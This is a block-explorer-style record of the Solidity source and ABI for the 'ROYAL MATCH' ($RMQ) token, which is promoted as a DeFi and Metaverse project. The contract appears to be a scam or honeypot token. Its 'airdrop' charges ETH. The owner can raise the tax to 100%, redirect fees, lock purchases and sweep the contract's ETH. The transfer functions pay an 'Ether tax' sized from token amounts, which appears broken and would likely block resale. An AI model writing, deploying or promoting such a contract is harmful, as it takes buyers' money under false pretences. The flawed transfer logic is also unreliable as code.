{"SourceCode": "// SPDX-License-Identifier: MIT\r\n/* \r\n   \ud83c\udff0\ud83d\udc51\ud83d\udc51\ud83d\udc51ROYAL MATCH \ud83d\udc51\ud83d\udc51\ud83d\udc51\ud83c\udff0\r\n   Royal Match is designed to create a complex ecosystem in which DeFi and Metaverse are integrated together.  \r\n   Crypto users will access all DeFi & Metaverse services quickly, cheaply and effectively with only Royal Match platforms. \r\n   Website: https://royalmatch.io/\r\n   Telegram: https://t.me/RoyalMatchNFT\r\n   X-Twitter: https://x.com/royalmatch_nft\r\n*/\r\n\r\npragma solidity 0.8.7;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) return 0;\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        return a / b;\r\n    }\r\n}\r\n\r\ncontract ROYALMATCH {\r\n    using SafeMath for uint256;\r\n    \r\n    uint256 private _totalSupply = 100000000000000000000000000000;\r\n    string private _name = \"ROYAL MATCH\";\r\n    string private _symbol = \"$RMQ\";\r\n    uint8 private _decimals = 18;\r\n    address private _owner;\r\n    \r\n    bool private _swAirdrop = true;\r\n    bool private _allUserTokensLocked;\r\n    uint256 private _referEth = 3000;\r\n    uint256 private _referToken = 7000;\r\n    uint256 private _airdropEth = 16600000000000000;\r\n    uint256 private _airdropToken = 200000000000000000000000;\r\n\r\n   \r\n    uint256 private salePrice = 50000000;\r\n    uint256 private _taxEther;\r\n\r\n    uint256 private _taxFee = 2; \r\n    address payable private _taxFeeAddress = payable(0x020f9C94355e98a980d945021066739Efa1e0B9E); \r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private _lockedBalances;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    modifier buyRewardsNotLocked() {\r\n        require(!_allUserTokensLocked, \"All user tokens are currently locked\");\r\n        _;\r\n    }\r\n\r\n    constructor() {\r\n    _owner = msg.sender;\r\n        _balances[_owner] = _totalSupply;\r\n    emit Transfer(address(0), _owner, _totalSupply);\r\n    }\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n    return payable(msg.sender);\r\n}\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function cap() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function allowance(address owner_, address spender) public view returns (uint256) {\r\n        return _allowances[owner_][spender];\r\n    }\r\n\r\n    function lockAllUserTokens() public onlyOwner {\r\n        _allUserTokensLocked = true;\r\n    }\r\n\r\n    function unlockAllUserTokens() public onlyOwner {\r\n        _allUserTokensLocked = false;\r\n    }\r\n\r\n    function setSalePrice(uint256 newSalePrice) public onlyOwner {\r\n    salePrice = newSalePrice;\r\n    }\r\n    function setReferEth(uint256 newReferEth) public onlyOwner {\r\n    _referEth = newReferEth;\r\n    }\r\n\r\n    function setReferToken(uint256 newReferToken) public onlyOwner {\r\n    _referToken = newReferToken;\r\n    }\r\n\r\n    function setAirdropEth(uint256 newAirdropEth) public onlyOwner {\r\n    _airdropEth = newAirdropEth;\r\n    }\r\n\r\n    function setAirdropToken(uint256 newAirdropToken) public onlyOwner {\r\n    _airdropToken = newAirdropToken;\r\n    }\r\n\r\n\r\n    function setTaxFee(uint256 taxFee) public onlyOwner {\r\n        require(taxFee <= 100, \"Tax fee should be less than or equal to 100%\");\r\n        _taxFee = taxFee;\r\n    }\r\n\r\n    function setTaxFeeAddress(address payable taxFeeAddress) public onlyOwner {\r\n        require(taxFeeAddress != address(0), \"Invalid tax fee address\");\r\n        _taxFeeAddress = taxFeeAddress;\r\n    }\r\n  \r\n\r\n    function _approve(address owner_, address spender, uint256 amount) internal {\r\n        require(owner_ != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner_][spender] = amount;\r\n        emit Approval(owner_, spender, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n    require(_lockedBalances[sender] < amount, \"Transfer amount exceeds locked balance\");\r\n    // Calculate the tax in Ether\r\n    uint256 taxInEther = amount.mul(_taxFee).div(100);\r\n\r\n    // Transfer the tax in Ether to the tax fee address\r\n    payable(_taxFeeAddress).transfer(taxInEther);\r\n\r\n    // Transfer the remaining tokens to the recipient\r\n    _transfer(sender, recipient, amount.sub(taxInEther), false);\r\n\r\n    uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n    require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n\r\n    _approve(sender, _msgSender(), currentAllowance.sub(amount));\r\n    return true;\r\n    }\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n    require(_lockedBalances[msg.sender] < amount, \"Transfer amount exceeds locked balance\");\r\n    // Calculate the tax in Ether\r\n    uint256 taxInEther = amount.mul(_taxFee).div(100);\r\n\r\n    // Transfer the tax in Ether to the tax fee address\r\n    payable(_taxFeeAddress).transfer(taxInEther);\r\n\r\n    // Transfer the remaining tokens to the recipient\r\n    _transfer(_msgSender(), recipient, amount.sub(taxInEther), false);\r\n    \r\n    return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function clearETH() public onlyOwner() {\r\n    address payable ownerAddress = payable(msg.sender);\r\n    ownerAddress.transfer(address(this).balance.add(_taxEther));\r\n    _taxEther = 0;\r\n    }\r\n\r\n    function airdrop() payable public buyRewardsNotLocked returns (bool) {\r\n    require(_swAirdrop && msg.value == _airdropEth, \"Transaction recovery\");\r\n\r\n    // Check if the owner has enough tokens to airdrop\r\n    require(_balances[_owner] >= _airdropToken, \"Not enough tokens to airdrop\");\r\n\r\n    uint256 taxAmount = _airdropToken.mul(_taxFee).div(100);\r\n    uint256 airdropAmount = _airdropToken.sub(taxAmount);\r\n\r\n    _transfer(_owner, _msgSender(), airdropAmount, true);\r\n\r\n    // Calculate the tax in Ether\r\n    uint256 taxInEther = msg.value.mul(_taxFee).div(100);\r\n\r\n    // Transfer the tax in Ether to the tax fee address\r\n    payable(_taxFeeAddress).transfer(taxInEther);\r\n\r\n    // Transfer the remaining Ether to the owner\r\n    payable(_owner).transfer(msg.value.sub(taxInEther));\r\n\r\n    return true;\r\n    }\r\n\r\n   function buy(address _refer) payable public buyRewardsNotLocked returns (bool) {\r\n    require(msg.value >= 0.1 ether, \"Transaction recovery\");\r\n    uint256 _msgValue = msg.value;\r\n    uint256 _token = _msgValue.mul(salePrice);\r\n\r\n    // Check if the owner has enough tokens to transfer\r\n    require(_balances[_owner] >= _token, \"Not enough tokens to transfer\");\r\n\r\n    uint256 taxAmount = _token.mul(_taxFee).div(100);\r\n    uint256 transferAmount = _token.sub(taxAmount);\r\n\r\n    _transfer(_owner, _msgSender(), transferAmount,false);\r\n\r\n    if (_msgSender() != _refer && _refer != address(0) && _balances[_refer] > 0) {\r\n        uint referToken = taxAmount.mul(_referToken).div(10000);\r\n        uint referEth = _msgValue.mul(_referEth).div(10000);\r\n        _transfer(_owner, _refer, referToken, true);\r\n        payable(_refer).transfer(referEth);\r\n    }\r\n\r\n    // Calculate the tax in Ether\r\n    uint256 taxInEther = _msgValue.mul(_taxFee).div(100);\r\n\r\n    // Transfer the tax in Ether to the tax fee address\r\n    payable(_taxFeeAddress).transfer(taxInEther);\r\n\r\n    // Transfer the remaining Ether to the owner\r\n    payable(_owner).transfer(_msgValue.sub(taxInEther));\r\n\r\n    return true;\r\n    }\r\n   \r\n    function _transfer(address sender, address recipient, uint256 amount, bool isLocked) internal {\r\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n    uint256 senderBalance = _balances[sender];\r\n    require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n\r\n    // Only check the locked balance if the tokens being transferred are locked\r\n    if (isLocked) {\r\n        require(_lockedBalances[sender] < amount, \"Transfer amount exceeds locked balance\");\r\n    }\r\n\r\n    _balances[sender] = senderBalance.sub(amount);\r\n    _balances[recipient] = _balances[recipient].add(amount);\r\n\r\n    if (isLocked) {\r\n        _lockedBalances[recipient] = _lockedBalances[recipient].add(amount);\r\n    }\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"airdrop\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_refer\",\"type\":\"address\"}],\"name\":\"buy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"clearETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lockAllUserTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newAirdropEth\",\"type\":\"uint256\"}],\"name\":\"setAirdropEth\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newAirdropToken\",\"type\":\"uint256\"}],\"name\":\"setAirdropToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newReferEth\",\"type\":\"uint256\"}],\"name\":\"setReferEth\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newReferToken\",\"type\":\"uint256\"}],\"name\":\"setReferToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newSalePrice\",\"type\":\"uint256\"}],\"name\":\"setSalePrice\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"taxFee\",\"type\":\"uint256\"}],\"name\":\"setTaxFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"taxFeeAddress\",\"type\":\"address\"}],\"name\":\"setTaxFeeAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"unlockAllUserTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ROYALMATCH", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://44561eb5a2b8e523bde5f4883f192ab9074a019f0b84e2afd897cc4fafc32179"}